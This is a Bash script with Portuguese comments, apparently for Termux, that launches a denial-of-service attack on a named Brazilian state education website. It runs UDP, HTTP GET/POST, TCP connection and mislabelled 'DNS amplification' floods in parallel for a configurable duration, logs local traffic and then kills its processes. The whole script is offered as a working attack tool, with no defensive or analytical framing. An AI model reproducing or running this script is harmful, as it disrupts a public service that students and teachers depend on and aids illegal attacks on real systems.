#!/usr/bin/env bash

# ============================================================
# DISTRIBUÍDO DO TERMUX: ATACANTE DE PRODUÇÃO
# Alvo: saladofuturo.educacao.sp.gov.br
# ============================================================

TARGET="saladofuturo.educacao.sp.gov.br"
DURATION=${1:-600} # Duração padrão: 10 minutos (segundos)
THREADS=${2:-100}  # Threads de conexão simultâneas

echo "[*] Iniciando ataque contra: $TARGET"
echo "[*] Duração: ${DURATION}s | Threads: ${THREADS}"
echo "[*] Pressione Ctrl+C para abortar."

# -----------------------------------------------------------
# 1. VERIFICAÇÃO DE CONECTIVIDADE E RESOLUÇÃO DNS
# -----------------------------------------------------------
if ! host $TARGET &>/dev/null; then
    echo "[-] Erro: Não foi possível resolver o DNS para $TARGET."
    echo "[-] Verifique sua conexão ou use o IP diretamente."
    exit 1
fi

TARGET_IP=$(host $TARGET | awk '{print $NF}')
echo "[+] Alvo resolvido para IP: $TARGET_IP"

# -----------------------------------------------------------
# 2. FUNÇÕES DE ATAQUE (EXECUTADAS EM BACKGROUND)
# -----------------------------------------------------------

# A. UDP FLOOD (Reflete carga no servidor de rede)
udp_flood() {
    echo "[*] Iniciando UDP Flood (Porta 53/80)..."
    # Envia pacotes UDP nulos para a porta 80 e 53
    for port in 80 53; do
        while :; do
            echo "TERMX_PAYLOAD_$(date +%s)" | nc -u -w1 $TARGET $port &
            sleep 0.01
        done
    done
}

# B. HTTP FLOOD (Exaustão de Workers do Webserver)
http_flood() {
    echo "[*] Iniciando HTTP Flood (GET/POST misto)..."
    # Usa curl em loop com múltiplos threads
    for i in $(seq 1 $THREADS); do
        (
            while :; do
                # GET com User-Agent de scanner para não ser filtrado inicialmente
                curl -s --max-time 5 -A "Mozilla/5.0 (Termux-Attacker; Linux) DoS/1.0" \
                     -H "Accept: text/html" \
                     "http://$TARGET/index.php" &>/dev/null
                
                # POST para forçar processamento de backend
                curl -s --max-time 5 -X POST \
                     -d "session_id=termux_$RANDOM&payload=attack" \
                     "http://$TARGET/api/login" &>/dev/null
            done
        ) &
    done
}

# C. SYN FLOOD / TCP CHAOS (Exaustão de Table de Conexões)
tcp_chaos() {
    echo "[*] Iniciando TCP Chaos (Half-Open Connections)..."
    # Abre conexões TCP que nunca são finalizadas (SYN Sent)
    for i in $(seq 1 500); do
        (
            while :; do
                nc $TARGET 80 &>/dev/null &
                # Mantém a conexão aberta por 2 segundos
                sleep 2
                kill %1 2>/dev/null
            done
        ) &
    done
}

# D. DNS AMPLIFICATION (Se houver um resolver local acessível)
dns_amplification() {
    echo "[*] Iniciando DNS Amplification (Query para o próprio servidor)..."
    # Envia queries DNS de texto longo para forçar o servidor a responder com pacotes grandes
    for i in $(seq 1 50); do
        (
            while :; do
                dig @1.1.1.1 -t TXT "$TARGET" &>/dev/null &
                sleep 0.05
            done
        ) &
    done
}

# -----------------------------------------------------------
# 3. EXECUÇÃO PARALELA
# -----------------------------------------------------------
echo "[*] Lançando todos os vetores de ataque em paralelo..."

udp_flood &
HTTP_PID=$!

http_flood &
HTTP_PID2=$!

tcp_chaos &
TCP_PID=$!

dns_amplification &
DNS_PID=$!

# -----------------------------------------------------------
# 4. MONITORAMENTO E LOG
# -----------------------------------------------------------
LOG_FILE="termux_dos_log_$(date +%s).log"
echo "Log de ataque em: $LOG_FILE"

# Monitora o uso de rede e CPU local
while true; do
    NET_STATS=$(cat /proc/net/dev | grep -E "eth0|wlan0" | awk '{print $2}')
    CPU_LOAD=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}')
    echo "[$(date +%H:%M:%S)] Traffic Out: ${NET_STATS} bytes | CPU Load: ${CPU_LOAD}%" >> $LOG_FILE
    sleep 5
done &
MONITOR_PID=$!

# -----------------------------------------------------------
# 5. DURAÇÃO DO ATAQUE
# -----------------------------------------------------------
echo "[*] Ataque em execução. Duração total: ${DURATION} segundos."
sleep $DURATION

# -----------------------------------------------------------
# 6. LIMPEZA
# -----------------------------------------------------------
echo "[*] Encerrando ataque. Limpando processos..."
kill $MONITOR_PID $HTTP_PID $HTTP_PID2 $TCP_PID $DNS_PID 2>/dev/null
pkill -f "curl.*$TARGET" 2>/dev/null
pkill -f "nc.*$TARGET" 2>/dev/null
pkill -f "dig.*$TARGET" 2>/dev/null

echo "[+] Ataque finalizado. Verifique o log em: $LOG_FILE"
echo "[+] Analise os impactos no site alvo."